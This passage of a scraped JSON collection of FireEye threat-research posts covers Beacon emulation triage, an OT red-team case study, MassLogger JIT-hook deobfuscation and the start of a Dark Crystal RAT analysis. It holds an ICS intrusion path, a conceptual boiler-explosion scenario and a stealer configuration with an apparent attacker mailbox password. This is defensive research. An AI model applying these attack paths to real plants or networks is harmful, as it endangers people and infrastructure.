Speakeasy to create a memory dump of the emulated address space. A ZIP archive will get created of each memory allocation along with context around it. This context includes base address, size and a tag that is assigned by the emulator in order to identify what the memory allocation corresponds to. Figure 11 shows a snippet of the memory dump files created during emulation. The file names contain the tag and base address associated with each memory allocation. Figure 11: Individual memory blocks acquired from emulation If we just run strings on these memory dumps, we can quickly locate interesting strings along with the Beacon configuration data, which is shown in Figure 12. Figure 12: Configuration string data for the malware In a triage level of analysis, we may only care about the indicators of compromise for a malware variant of a known family. However, if full reverse engineering of the sample is required, we can also recover the decoded version of the Beacon malware in its DLL form. By simply doing a primitive grep for the “MZ” magic bytes, we find the only hits are the memory dumps related to the original sample’s allocation and the virtual allocated buffer that the malware copies itself to (Figure 13). Figure 13: Memory dump containing the decoded malware If we look at the bytes in the original shellcode buffer, we can see that it was decoded before it was copied and is sitting in memory ready to be dumped at offset 0x48. We can now successfully load the decoded Beacon DLL into IDA Pro for full analysis (Figure 14). Figure 14: Decoded malware successfully loaded into IDA Pro Conclusion In this blog post we demonstrated how the Speakeasy emulation framework can be used to automatically triage a Beacon malware sample. We used it to discover valuable network indicators, extract its config information from memory, and acquire a decoded Beacon DLL for further analysis. Head over to our GitHub to start using Speakeasy today , and stay tuned for the next blog post where we will demonstrate kernel malware analysis using emulation. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/08/hands-on-introduction-to-mandiant-approach-to-ot-red-teaming.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-08-25",
                    "source": "www.fireeye.com"
                },
                "text": "Operational technology (OT) asset owners have historically considered red teaming of OT and industrial control system (ICS) networks to be too risky due to the potential for disruptions or adverse impact to production systems. While this mindset has remained largely unchanged for years, Mandiant's experience in the field suggests that these perspectives are changing; we are increasingly delivering value to customers by safely red teaming their OT production networks. This increasing willingness to red team OT is likely driven by a couple of factors, including the growing number and visibility of threats to OT systems, the increasing adoption of IT hardware and software into OT networks, and the maturing of OT security teams. In this context, we deemed it relevant to share some details on Mandiant's approach to red teaming in OT based on years of experience supporting customers learning about tangible threats in their production environments. In this post we introduce Mandiant's approach to OT red teaming and walk through a case study. During that engagement, it took Mandiant only six hours to gain administrative control on the target's OLE for Process Control (OPC) servers and clients in the target's Distributed Control System (DCS) environment. We then used this access to collect information and develop an attack scenario simulating the path a threat actor could take to prepare for and attack the physical process (We highlight that the red team did not rely on weaknesses of the DCS, but instead weak password implementations in the target environment). NOTE: Red teaming in OT production systems requires planning, preparation and \"across the aisle\" collaboration. The red team must have deep knowledge of industrial process control and the equipment, software, and systems used to achieve it. The red team and the asset owner must establish acceptable thresholds before performing any activities. Visit our website for more information or to request Mandiant services or threat intelligence . Mandiant's Approach for Safe Red Teaming in OT Mandiant's approach to red teaming OT production systems consists of two phases: active testing on IT and/or OT intermediary systems, and custom attack modeling to develop one or more realistic attack scenarios. Our approach is designed to mirror the OT-targeted attack lifecycle—with active testing during initial stages (Initial Compromise, Establish Foothold, Escalate Privileges, and Internal Reconnaissance), and a combination of active/passive data collection and custom threat modeling to design feasible paths an attacker would follow to complete the mission. Figure 1: Mandiant OT red teaming approach Mandiant's OT red teaming may begin either from the perspective of an external attacker leveraging IT compromises to pivot into the OT network, or from the perspective of an actor who has already gained access into the OT network and is ready to escalate the intrusion. We then leverage a range of commodity tools and utilities that are widely available in most target environments to pivot across OT intermediary systems and gain privileged access to target ICS. Throughout this process, we maintain constant communication with the customer to establish safety thresholds. Active participation from the defenders will also enable the organization to learn about the techniques we use to extract information and the weaknesses we exploit to move across the target network. Once the active testing stops at the agreed safety threshold, we compile this information and perform additional research on the system and processes to develop realistic and target-specific attack scenarios based on our expertise of threat actor behaviors. Mandiant's OT red teaming can be scoped in different ways depending on the target environment, the organization's goals, and the asset owner's cyber security program maturity. For example, some organizations may test the full network architecture, while others prefer to sample only an attack on a single system or process. This type of sampling is useful for organizations that own a large number of processes and are unlikely to test them one by one, but instead they can learn from a single-use case that reflects target-specific weaknesses and vulnerabilities. Depending on the scope, the red teaming results can be tailored to: Model attack scenarios based on target-specific vulnerabilities and determine the scope and consequences if a threat actor were to exploit them in their environment. Model attack paths across the early stages of reconnaissance and lateral movement to identify low-hanging fruit that adversaries may exploit to enable further compromise of OT. Operationalize threat intelligence to model scenarios based on tactics, techniques, and procedures (TTPs) from known actors, such as advanced persistent threats (APTs). Test specific processes or systems deemed at high risk of causing a disruption to safety or operations. This analysis highlights gaps or weaknesses to determine methods needed to secure high-risk system(s). Red Teaming in OT Provides Unique Value to Defenders Red teaming in OT can be uniquely helpful for defenders, as it generates value in a way very specific to an organizations' needs, while decreasing the gap between the \"no holds barred\" world of real attackers and the \"safety first\" responsibility of the red team. While it is common for traditional red teaming engagements to end shortly after the attacker pivots into a production OT segment, a hybrid approach, such as the one we use, makes it possible for defenders to gain visibility into the specific strengths and weaknesses of their OT networks and security implementations. Here are some other benefits of red teaming in OT production networks: It helps defenders understand and foresee possible paths that sophisticated actors may follow to reach specific goals. While cyber threat intelligence is another great way to build this knowledge, red teaming allows for additional acquisition of site-specific data. It responds to the needs of defenders to account for varying technologies and architectures present in OT networks across different industries and processes. As a result, it accounts for outliers that are often not covered by general security best practices guidance. It results in tangible and realistic outputs based on our active testing showing what can really happen in the target network. Mandiant's OT red teaming results often show that common security testing tools are sufficient for actors to reach critical process networks. It results in conceptual attack scenarios based on real attacker behaviors and specific knowledge about the target. While the scenarios may sometimes highlight weaknesses or vulnerabilities that cannot be patched, these provide defenders with the knowledge needed to define alternative mitigations to mitigate risks earlier in the lifecycle. It can help to identify real weaknesses that could be exploited by an actor at different stages of the attack lifecycle. With this knowledge, defenders can define ways to stop threat activity before it reaches critical production systems, or at least during early phases of the intrusion. Applying Our Approach in the Real World: Big Steam Works During this engagement, we were tasked with gaining access to critical control systems and designing a destructive attack in an environment where industrial steaming boilers are operated with an Distributed Control System (DCS). In this description, we redacted customer information—including the name, which we refer to as \"Big Steam Works\"—and altered sensitive details. However, the overall attack techniques remain unchanged. The main objective of Big Steam Works is to deliver steam to a nearby chemical production company. For the scope of this red team, the customer wanted to focus entirely on its OT production network. We did not perform any tests in IT networks and instead begun the engagement with initial access granted in the form of a static IP address in Big Steam Work's OT network. The goal of the engagement was to deliver consequence-driven analysis exploring a scenario that could cause a significant physical impact to both safety and operations. Following our red teaming approach, the engagement was divided in two phases: active testing across IT and/or OT intermediary systems, and custom attack modeling to foresee paths an attacker may follow to complete its mission. We note that during the active testing phase we were very careful to maintain high safety standards. This required not only highly skilled personnel with knowledge about both IT and OT, but also constant engagement with the customer. Members from Big Steam Works helped us to set safety thresholds to stop and evaluate results before moving forward, and actively monitored the test to observe, learn, and remain vigilant for any unintended changes in the process. Phase 1 – Active Testing During this phase, we leveraged publicly accessible offensive security tools (including Wireshark, Responder, Hashcat, and CrackMapExec) to collect information, escalate privileges, and move across the OT network. In close to six hours, we achieved administrative control on several Big Steam Works' OLE for Process Control (OPC) servers and clients in their DCS environment. We highlight that the test did not rely on weaknesses of the DCS, but instead weak password implementations in the target environment. Figure 2 details our attack path: Figure 2: Active testing in Big Steam Work's OT network We collected network traffic using Wireshark to map network communications and identify protocols we could use for credential harvesting, lateral movement, and privilege escalation. Passive analysis of the capture showed Dynamic Host Configuration Protocol (DHCP) broadcasts for IPv6 addresses, Link-Local Multicast Name Resolution (LLMNR) protocol traffic, and NetBios Name Service (NBT-NS) traffic. We responded to broadcast LLMNR, NBT-NS, and WPAD name resolution requests from devices using a publicly available tool called Responder. As we supplied our IP address in response to broadcasted name resolution requests from other clients on the subnet, we performed man-in-the-middle (MiTM) attacks and obtained NTLMv1/2 authentication protocol password hashes from devices on the network. We then used Hashcat to crack the hashed credentials and use them for further lateral movement and compromise. The credentials we obtained included, but were not limited to, service accounts with local administrator rights on OPC servers and clients. We note that Hashcat cracked the captured credentials in only six seconds due to the lack of password strength and complexity. With the credentials captured in the first three steps, we accessed other hosts on the network using CrackMapExec. We dumped additional cached usernames, passwords, and password hashes belonging to both local and domain accounts from these hosts. This resulted in privileged access and control over the DCS's OPC clients and servers in the network. While we did not continue to execute any further attack, the level of access gained at this point enabled us to perform further reconnaissance and data collection to design and conceptualize the last steps of a targeted attack on the industrial steaming boilers. The TTPs we used during the active testing phase resemble some of the simplest resources that can be used by threat actors during real OT intrusions. The case results are concerning given that they illustrate only a few of the most common weaknesses we often observe across Mandiant OT red team engagements. We highlight that all the tools used for this intrusion are known and publicly available. An attacker with access to Big Steam Works could have used these methods as they represent low-hanging fruit and can often be prevented with simple security mitigations. Phase 2 – Custom Attack Modeling For roughly a week, Mandiant gathered additional information from client documentation and research on industrial steaming boilers. We then mirrored the process an attacker would follow to design a destructive attack on the target process given the results achieved during phase 1. At this point of the intrusion, the attacker would have already obtained complete control over Big Steam Works' OPC clients and servers, gaining visibility and access to the DCS environment. Before defining the path to follow, the attacker would likely have to perform further reconnaissance (e.g., compromising additional systems, data, and credentials within the Big Steam Works DCS environment). Specifically, the attacker could: Gain access to the DCS configuration software/engineering workstation Obtain configuration/control logic files Determine the type/function of the different DCS nodes in the environment Use native DCS tools for system overview, graphics display, and point drill down Identify alarms/alerts monitored by operators via remote HMI screens and map them to defined points Map the flow of the physical process based on data collection and review Our next step was to develop the custom scenario. For this example, we were tasked with modeling a case where the attacker was attempting to create a condition that had a high likelihood of causing physical damage and disruption of operations (see Figure 3). In this scenario, the attacker attempted to achieve this by lowering the water level in a boiler drum below the safe threshold while not tripping the burner management system or other safety mechanisms. If successful, this would result in rapid and extreme overheating in the boiler. Opening the feedwater valve under such conditions could result in a catastrophic explosion. Figure 3: Custom attack model diagram for Big Steam Works Figure 3 describes how a real attacker might pursue their mission after gaining access to the OPC servers and clients. As the actor moves closer to their goals, it becomes more difficult to assess both the probability of success and the actual impact of their actions due to nuances specific to the client environment and additional safety and security controls built into the process. However, the analysis holds significant value as it illustrates the overall structure of the physical process and potential attacker behaviors aimed at achieving specific end goals. Furthermore, it proceeds directly from the results obtained during the first phase of the red teaming. The model presents one feasible combination of actions that an attacker could perform to access devices governing the boiler drum and modify the water level while remaining undetected. With the level of access obtained from phase 1, the attacker would likely be able to compromise engineering workstations (EWS) for the boiler drum's controller using similar tools. This would likely enable the actor to perform actions such as changing the drum level setpoints, modifying the flow of steam scaling, or modifying water flow scaling. While the model does not reflect all additional safety and security measures that may be present deeper in the process, it does account for the attacker's need to modify alarms and control sensor outputs to remain undetected. By connecting the outcomes produced in the test to the potential physical impacts and motivations involved in a real attack, this model provided Big Steam Works with a realistic overview of cyber security threats to a specific physical process. Further collaboration with the customer enabled us to validate the findings and support the organization to mitigate the risks reflected in the model. Outlook Mandiant's OT red teaming supports organizations by combining both the hands-on analysis of vulnerabilities and weaknesses in IT and OT networks with the conceptual modeling of attacker goals and possible avenues to reach specific outcomes. It also enables security practitioners to adopt the attacker's perspective and explore attack vectors that may otherwise have not been conceived regardless of their value as low-hanging fruit for OT intrusions. Our approach presents realistic scenarios based upon technical evidence of intrusion activity upon OT intermediary systems in the tested network. In this way, it is tailored to support consequence-driven analysis of threats to specific critical systems and processes. This enables organizations to identify attack scenarios involving digital assets and determine safeguards that can best help to protect the process and ensure the safety of their facilities. Head over to our website for more information or to request Mandiant services or threat intelligence . Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/08/bypassing-masslogger-anti-analysis-man-in-the-middle-approach.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-08-06",
                    "source": "www.fireeye.com"
                },
                "text": "The FireEye Front Line Applied Research & Expertise (FLARE) Team attempts to always stay on top of the most current and emerging threats. As a member of the FLARE Reverse Engineer team, I recently received a request to analyze a fairly new credential stealer identified as MassLogger. Despite the lack of novel functionalities and features, this sample employs a sophisticated technique that replaces the Microsoft Intermediate Language (MSIL) at run time to hinder static analysis. At the time of this writing, there is only one publication discussing the MassLogger obfuscation technique in some detail. Therefore, I decided to share my research and tools to help analyze MassLogger and other malware using a similar technique . Let us take a deep technical dive into the MassLogger credential stealer and the .NET runtime. Triage MassLogger is a .NET credential stealer. It starts with a launcher ( 6b975fd7e3eb0d30b6dbe71b8004b06de6bba4d0870e165de4bde7ab82154871 ) that uses simple anti-debugging techniques which can be easily bypassed when identified. This first stage loader eventually XOR-decrypts the second stage assembly which then decrypts, loads and executes the final MassLogger payload ( bc07c3090befb5e94624ca4a49ee88b3265a3d1d288f79588be7bb356a0f9fae ) named Bin-123.exe . The final payload can be easily extracted and executed independently. Therefore, we will focus exclusively on this final payload where the main anti analysis technique is used. Basic static analysis doesn’t reveal anything too exciting. We notice some interesting strings, but they are not enough to give us any hints about the malware’s capabilities. Executing the payload in a controlled environment shows that the sample drops a log file that identifies the malware family, its version, and most importantly some configuration options. A sample log file is described in Figure 1. We can also extract some interesting strings from memory as the sample runs. However, basic dynamic analysis is not sufficient to extract all host-based indicators (HBIs), network-based indicators (NBIs) and complete malware functionality. We must perform a deeper analysis to better understand the sample and its capabilities. User Name: user IP: 127.0.0.1 Location: United States OS: Microsoft Windows 7 Ultimate 32bit CPU: Intel(R) Core(TM) i7-6820HQ CPU @ 2.70GHz GPU: VMware SVGA 3D AV: NA Screen Resolution: 1438x2460 Current Time: 6/17/2020 1:23:30 PM MassLogger Started: 6/17/2020 1:23:21 PM Interval: 2 hour MassLogger Process: C:\\Users\\user\\Desktop\\Bin-123.exe MassLogger Melt: false MassLogger Exit after delivery: false As Administrator: False Processes: Name:cmd, Title:Administrator: FakeNet-NG - fakenet Name:iexplore, Title:FakeNet-NG - Internet Explorer Name:dnSpy-x86, Title:dnSpy v6.0.5 (32-bit) Name:cmd, Title:Administrator: C:\\Windows\\System32\\cmd.exe Name:ProcessHacker, Title:Process Hacker [WIN-R23GG4KO4SD\\user]+ (Administrator) ### WD Exclusion ### Disabled ### USB Spread ### Disabled ### Binder ### Disabled ### Window Searcher ### Disabled ### Downloader ### Disabled ### Bot Killer ### Disabled ### Search And Upload ### Disabled ### Telegram Desktop ### Not Installed ### Pidgin ### Not Installed ### FileZilla ### Not Installed ### Discord Tokken ### Not Installed ### NordVPN ### Not Installed ### Outlook ### Not Installed ### FoxMail ### Not Installed ### Thunderbird ### Not Installed ### QQ Browser ### Not Installed ### FireFox ### Not Installed ### Chromium Recovery ### Not Installed ### Keylogger And Clipboard ### [20/06/17]  [Welcome to Chrome - Google Chrome] [ESC] [20/06/17]  [Clipboard] Vewgbprxvhvjktmyxofjvpzgazqszaoo Figure 1: Sample MassLogger log Just Decompile It Like many other .NET malwares, MassLogger obfuscates all of its methods names and even the method control flow. We can use de4dot to automatically deobfuscate the MassLogger payload. However, looking at the deobfuscated payload, we quickly identify a major issue: Most of the methods contain almost no logic as shown in Figure 2. Figure 2: dnSpy showing empty methods Looking at the original MassLogger payload in dnSpy ’s Intermediate Language (IL) view confirms that most methods do not contain any logic and simply return nothing. This is obviously not the real malware since we already observed with dynamic analysis that the sample indeed performs malicious activities and logging to a log file. We are left with a few methods, most notably the method with the token 0x0600049D called first thing in the main module constructor. Figure 3: dnSpy IL view showing the method's details Method 0x0600049D control flow has been obfuscated into a series of switch statements. We can still somewhat follow the method’s high-level logic with the help of dnSpy as a debugger. However, fully analyzing the method would be very time consuming. Instead, when first analyzing this payload, I chose to quickly scan over the entire module to look for hints. Luckily, I spot a few interesting strings I missed during basic static analysis: clrjit.dll , VirtualAlloc , VirtualProtect and WriteProcessMemory as seen in Figure 4. Figure 4: Interesting strings scattered throughout the module A quick internet search for “ clrjit.dll ” and “ VirtualProtect ” quickly takes us to a few publications describing a technique commonly referred to as Just-In-Time Hooking. In essence, JIT Hooking involves installing a hook at the compileMethod() function where the JIT compiler is about to compile the MSIL into assembly (x86, x64, etc). With the hook in place, the malware can easily replace each method body with the real MSIL that contains the original malware logic. To fully understand this process, let’s explore the .NET executable, the .NET methods, and how MSIL turns into x86 or x64 assembly. .NET Executable Methods A .NET executable is just another binary following the Portable Executable (PE) format. There are plenty of resources describing the PE file format , the .NET metadata and the .NET token tables in detail. I recommend our readers to take a quick detour and refresh their memory on those topics before continuing. This post won’t go into further details but will focus on the .NET methods instead. Each .NET method in a .NET assembly is identified by a token. In fact, everything in a .NET assembly, whether it’s a module, a class, a method prototype, or a string, is identified by a token. Let’s look at method identified by the token 0x0600049D , as shown in Figure 5. The most-significant byte ( 0x06 ) tells us that this token is a method token (type 0x06 ) instead of a module token (type 0x00 ), a TypeDef token (type 0x02 ), or a LocalVarSig token (type 0x11 ), for example. The three least significant bytes tell us the ID of the method, in this case it’s 0x49D ( 1181 in decimal). This ID is also referred to as the Method ID (MID) or the Row ID of the method. Figure 5: Method details for method 0x0600049D To find out more information about this method, we look within the tables of the “ #~ ” stream of the .NET metadata streams in the .NET metadata directory as show in Figure 6. We traverse to the entry number 1181 or 0x49D of the Method table to find the method metadata which includes the Relative Virtual Address (RVA) of the method body, various flags, a pointer to the name of the method, a pointer to the method signature, and finally, an pointer to the parameters specification for this method. Please note that the MID starts at 1 instead of 0 . Figure 6: Method details from the PE file header For method 0x0600049D , the RVA of the method body is 0xB690 . This RVA belongs to the .text section whose RVA is 0x2000 . Therefore, this method body begins at 0x9690 ( 0xB690 – 0x2000 ) bytes into the .text section. The .text section starts at 0x200 bytes into the file according to the section header. As a result, we can find the method body at 0x9890 ( 0x9690 + 0x200 ) bytes offset into the file. We can see the method body in Figure 7. Figure 7: Method 0x0600049D body in a hex editor .NET Method Body The .NET method body starts with a method body header, followed by the MSIL bytes. There are two types of .NET methods: a tiny method and a fat method. Looking at the first byte of the method body header, the two least-significant bits tell us if the method is tiny (where the last two bits are 10 ) or fat (where the last two bits are 11 ). .NET Tiny Method Let’s look at method 0x06000495 . Following the same steps described earlier, we check the row number 0x495 ( 1173 in decimal) of the Method table to find the method body RVA is 0x7A7C which translates to 0x5C7C as the offset into the file. At this offset, the first byte of the method body is 0x0A ( 0000 1010 in binary). Figure 8: Method 0x06000495 metadata and body Since the two least-significant bits are 10 , we know that 0x06000495 is a tiny method. For a tiny method, the method body header is one byte long . The two least-significant bits are 10 to indicate that this is the tiny method, and the six most-significant bits tell us the size of the MSIL to follow (i.e. how long the MSIL is). In this case, the six most-significant bits are 000010 , which tells us the method body is two bytes long. The entire method body for 0x06000495 is 0A 16 2A , followed by a NULL byte, which has been disassembled by dnSpy as shown in Figure 9. Figure 9: Method 0x06000495 in dnSpy IL view .NET Fat Method Coming back to method 0x0600049D (entry number 1181 ) at offset 0x9890 into the file (RVA 0xB690 ), the first byte of the method body is 0x1B (or 0001 1011 in binary). The two least-significant bits are 11 , indicating that 0x0600049D is a fat method. The fat method body header is 12-byte long whose structure is beyond the scope of this blog post. The field we really care about is a four-byte field at offset 0x04 byte into this fat header. This field specifies the length of the MSIL that follows this method body header. For method 0x0600049D , the entire method body header is “ 1B 30 08 00 A8 61 00 00 75 00 00 11 ” and the length of the MSIL to follow is “ A8 61 00 00 ” or 0x61A8 ( 25000 in decimal) bytes. Figure 10: Method 0x0600049D body in a hex editor JIT Compilation Whether a method is tiny or fat, it does not execute as is. When the .NET runtime needs to execute a method, it follows exactly the process described earlier to find the method body which includes the method body header and the MSIL bytes. If this is the first time the method needs to run, the .NET runtime invokes the Just-In-Time compiler which takes the MSIL bytes and compiles them into x86 or x64 assembly depending on whether the current process is 32- or 64-bit. After some preparation, the JIT compiler eventually calls the compileMethod() function. The entire .NET runtime project is open-sourced and available on GitHub . We can easily find out that the compileMethod() function has the following prototype (Figure 11): CorJitResult __stdcall compileMethod ( ICorJitInfo                       *comp,               /* IN */ CORINFO_METHOD_INFO               * info ,               /* IN */ unsigned /* code:CorJitFlag */    flags,               /* IN */ BYTE                              **nativeEntry,       /* OUT */ ULONG                             *nativeSizeOfCode    /* OUT */ ); Figure 11: compileMethod() function protype Figure 12 shows the CORINFO_METHOD_INFO structure. struct CORINFO_METHOD_INFO { CORINFO_METHOD_HANDLE       ftn; CORINFO_MODULE_HANDLE       scope; BYTE * ILCode ; unsigned ILCodeSize ; unsigned                    maxStack; unsigned                    EHcount; CorInfoOptions              options; CorInfoRegionKind           regionKind; CORINFO_SIG_INFO            args; CORINFO_SIG_INFO            locals; }; Figure 12: CORINFO_METHOD_INFO structure The ILCode is a pointer to the MSIL of the method to compile, and the ILCodeSize tells us how long the MSIL is. The return value of compileMethod() is an error code indicating success or failure. In case of success, the nativeEntry pointer is populated with the address of the executable memory region containing the x86 or the x64 instruction that is compiled from the MSIL. MassLogger JIT Hooking Let’s come back to MassLogger. As soon as the main module initialization runs, it first decrypts MSIL of the other methods. It then installs a hook to execute its own version of compileMethod() (method 0x06000499 ). This method replaces the ILCode and ILCodeSize fields of the info argument to the original compileMethod() with the real malware’s MSIL bytes. In addition to replacing the MSIL bytes, MassLogger also patches the method body header at module initialization time. As seen from Figure 13, the method body header of method 0x060003DD on disk (at file offset 0x3CE0) is different from the header in memory (at RVA 0x5AE0 ). The only two things remaining quite consistent are the least significant two bits indicating whether the method is tiny or fat. To successfully defeat this anti-analysis technique, we must recover the real MSIL bytes as well as the correct method body headers. Figure 13: Same method body with different headers when resting on disk vs. loaded in memory Defeating JIT Method Body Replacement With JITM To automatically recover the MSIL and the method body header, one possible approach suggested by another FLARE team member is to install our own hook at compileMethod() function before loading and allowing the MassLogger module constructor to run.  There are multiple tutorials and open-sourced projects on hooking compileMethod() using both managed hooks (the new compileMethod() is a managed method written in C#) and native hooks (the new compileMethod() is native and written in C or C++). However, due to the unique way MassLogger hooks compileMethod() , we cannot use the vtable hooking technique implemented by many of the aforementioned projects. Therefore, I’d like to share the following project: JITM , which is designed use inline hooking implemented by PolyHook library. JITM comes with a wrapper for compileMethod() which logs all the method body headers and MSIL bytes to a JSON file before calling the original compileMethod() . In addition to the hook, JITM also includes a .NET loader. This loader first loads the native hook DLL ( jitmhook.dll ) and installs the hook. The loader then loads the MassLogger payload and executes its entry point. This causes MassLogger’s module initialization code to execute and install its own hook, but hooking jitmhook.dll code instead of the original compileMethod() . An alternative approach to executing MassLogger’s entry point is to call the RuntimeHelpers.PrepareMethod() API to force the JIT compiler to run on all methods. This approach is better because it avoids running the malware, and it potentially can recover methods not called in the sample’s natural code path. However, additional work is required to force all methods to be compiled properly. To load and recover MassLogger methods, first run the following command (Figure 14): jitm.exe Bin-123.exe [optional_timeout] Figure 14: Command to run jitm Once the timeout expires, you should see the files jitm.log and jitm.json created in the current directory. jitm.json contains the method tokens, method body headers and MSIL bytes of all methods recovered from Bin-123.exe . The only thing left to do is to rebuild the .NET metadata so we can perform static analysis. Figure 15: Sample jitm.json Rebuilding the Assembly Since the decrypted method body headers and MSIL bytes may not fit in the original .NET assembly properly, the easiest thing to do is to add a new section and a section header to MassLogger. There are plenty of resources on how to add a PE section header and data , none of which is trivial or easy to automate. Therefore, JITM also include the following Python 2.7 helper script to automate this process: Scripts\\addsection.py . With the method body header and MSIL of each method added to a new PE section as shown in Figure 16, we can easily parse the .NET metadata and fix each method’s RVA to point to the correct method body within the new section. Unfortunately, I did not find any Python library to easily parse the .NET metadata and the MethodDef table. Therefore, JITM also includes a partially implemented .NET metadata parser: Script\\pydnet.py . This script uses pefile and vivisect modules and parses the PE file up to the Method table to extract all methods and their associated RVAs. Figure 16: Bin-123.exe before and after adding an additional section named FLARE Finally, to tie everything together, JITM provides Script\\fix_assembly.py to perform the following tasks: Write the method body header and MSIL of each method recovered in jitm.json into a temporary binary file named “ section.bin ” while at the same time remember the associated method token and the offset into section.bin . Use addsection.py to add section.bin into Bin-123.exe and save the data into a new file, e.g. Bin-123.fixed.exe . Use pydnet.py to parse Bin-123.fixed.exe and update the RVA field of each method entry in the MethodDef table to point to the correct RVA into the new section. The final result is a partially reconstructed .NET assembly. Although additional work is necessary to get this assembly to run correctly, it is good enough to perform static analysis to understand the malware’s high-level functionalities. Let’s look at the reconstructed method 0x0600043E that implements the decryption logic for the malware configuration. Compared to the original MSIL, the reconstructed MSIL now shows that the malware uses AES-256 in CBC mode with PKCS7 padding. With a combination of dynamic analysis and static analysis, we can also easily identify the key to be “ Vewgbprxvhvjktmyxofjvpzgazqszaoo ” and the IV to be part of the Base64 -encoded buffer passed in as its argument. Figure 17: Method 0x0600043 before and after fixing the assembly Armed with that knowledge, we can write a simple tool to decrypt the malware configuration and recover all HBIs and NBIs (Figure 18). BinderBytes: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BinderName: Mzvmy_Nyrrd BinderOnce: false DownloaderFilename: Hrebxs DownloaderOnce: false DownloaderUrl: Vrwus EmailAddress: appfoil@outlook.com EmailClient: smtp.outlook.com EmailEnable: true EmailPass: services000 EmailPort: 587 EmailSendTo: appfoil@outlook.com EmailSsl: True EnableAntiDebugger: false EnableAntiHoneypot: false EnableAntiSandboxie: false EnableAntiVMware: false EnableBinder: false EnableBotKiller: false EnableBrowserRecovery: true EnableDeleteZoneIdentifier: false EnableDownloader: false EnableForceUac: false EnableInstall: false EnableKeylogger: true EnableMemoryScan: false EnableMutex: false EnableScreenshot: false EnableSearchAndUpload: false EnableSpreadUsb: false EnableWDExclusion: false EnableWindowSearcher: false ExectionDelay: 6 ExitAfterDelivery: false FtpEnable: false FtpHost: ftp://127.0.0.1 FtpPass: FtpPort: 21 FtpUser: Foo InstallFile: Pkkbdphw InstallFolder: %AppData% InstallSecondFolder: Eqrzwmf Key: Mutex: Ysjqh PanelEnable: false PanelHost: http://example.com/panel/upload.php SearchAndUploadExtensions: .jpeg, .txt, .docx, .doc, SearchAndUploadSizeLimit: 500000 SearchAndUploadZipSize: 5000000 SelfDestruct: false SendingInterval: 2 Version: MassLogger v1.3.4.0 WindowSearcherKeywords: youtube, facebook, amazon, Figure 18: Decrypted configuration Conclusion Using a JIT compiler hook to replace the MSIL is a powerful technique that makes static analysis almost impossible. Although this technique is not new, I haven’t seen many .NET malwares making use of it, let alone trying to implement their own adaptation instead of using widely available protectors like ConfuserEx. Hopefully, with this blog post and JITM , analysts will now have the tools and knowledge to defeat MassLogger or any future variants that use a similar technique. If this is the type of work that excites you; and, if you thrive to push the state of the art when it comes to malware analysis and reverse engineering, the Front Line Applied Research and Expertise (FLARE) team may be a good place for you. The FLARE team faces fun and exciting challenges on a daily basis; and we are constantly looking for more team members to tackle these challenges head on. Check out FireEye’s career page to see if any of our opportunities would be a good fit for you. Contributors (Listed Alphabetically) Tyler Dean ( @spresec ): Technical review of the post Michael Durakovich: Technical review of the post Stephen Eckels ( @stevemk14ebr ): Help with porting JITM to use PolyHook Jon Erickson ( @evil-e ): Technical review of the post Moritz Raabe ( @m_r_tz ): Technical review of the post Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/05/analyzing-dark-crystal-rat-backdoor.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-05-12",
                    "source": "www.fireeye.com"
                },
                "text": "The FireEye Mandiant Threat Intelligence Team helps protect our customers by tracking cyber attackers and the malware they use. The FLARE Team helps augment our threat intelligence by reverse engineering malware samples. Recently, FLARE worked on a new C# variant of Dark Crystal RAT (DCRat) that the threat intel team passed to us. We reviewed open source intelligence and prior work, performed sandbox testing, and reverse engineered the Dark Crystal RAT to review its capabilities and communication protocol. Through publishing this blog post we aim to help defenders look for indicators of compromise and other telltale signs of Dark Crystal RAT, and to assist fellow malware researchers new to .NET malware, or who encounter future variants of this sample. Discovering Dark Crystal RAT The threat intel team provided FLARE with an EXE sample, believed to contain Dark Crystal RAT, and having the MD5 hash b478d340a787b85e086cc951d0696cb1. Using sandbox testing, we found that this sample produced two executables, and in turn, one of those two executables produced three more. Figure 1 shows the relationships between the malicious executables discovered via sandbox testing. Figure 1: The first sample we began analyzing ultimately produced five executables. Armed with the sandbox results, our next step was to perform a triage analysis on each executable. We found that the original sample and mnb.exe were droppers, that dal.exe was a clean-up utility to delete the dropped files, and that daaca.exe and fsdffc.exe were variants of Plurox, a family with existing reporting. Then we moved to analyzing the final dropped sample, which was dfsds.exe. We found brief public reporting by @ James_inthe_box on the same sample, identifying it as DCRat and as a RAT and credential stealer . We also found a public sandbox run that included the same sample. Other public reporting described DCRat, but actually analyzed the daaca.exe Plurox component bundled along with DCRat in the initial sample. Satisfied that dfsds.exe was a RAT lacking detailed public reporting, we decided to perform a deeper analysis. Analyzing Dark Crystal RAT Initial Analysis Shifting aside from our sandbox for a moment, we performed static analysis on dfsds.exe. We chose to begin static analysis using CFF Explorer, a good tool for opening a PE file and breaking down its sections into a form that is easy to view. Having viewed dfsds.exe in CFF Explorer, as shown in Figure 2, the utility showed us that it is a .NET executable. This meant we could take a much different path to analyzing it than we would on a native C or C++ sample. Techniques we might have otherwise used to start narrowing down a native sample’s functionality, such as looking at what DLLs it imports and what functions from those DLLs that it uses, yielded no useful results for this .NET sample. As shown in Figure 3, dfsds.exe imports only the function _CorExeMain from mscoree.dll. We could have opened dfsds.exe in IDA Pro, but IDA Pro is usually not the most effective way of analyzing .NET samples; in fact, the free version of IDA Pro cannot handle .NET Common Language Infrastructure (CLI) intermediate code. Figure 2: CFF Explorer shows that dfsds.exe is a .NET executable. Figure 3: The import table for dfsds.exe is not useful as it contains only one function. Instead of using a disassembler like IDA Pro on dfsds.exe, we used a .NET decompiler. Luckily for the reverse engineer, decompilers operate at a higher level and often produce a close approximation of the original C# code. dnSpy is a great .NET decompiler. dnSpy’s interface displays a hierarchy of the sample’s namespaces and classes in the Assembly Explorer and shows code for the selected class on the right. Upon opening dfsds.exe, dnSpy told us that the sample’s original name at link time was DCRatBuild.exe, and that its entry point is at <PrivateImplementationDetails>{63E52738-38EE-4EC2-999E-1DC99F74E08C}.Main , shown in Figure 4. When we browsed 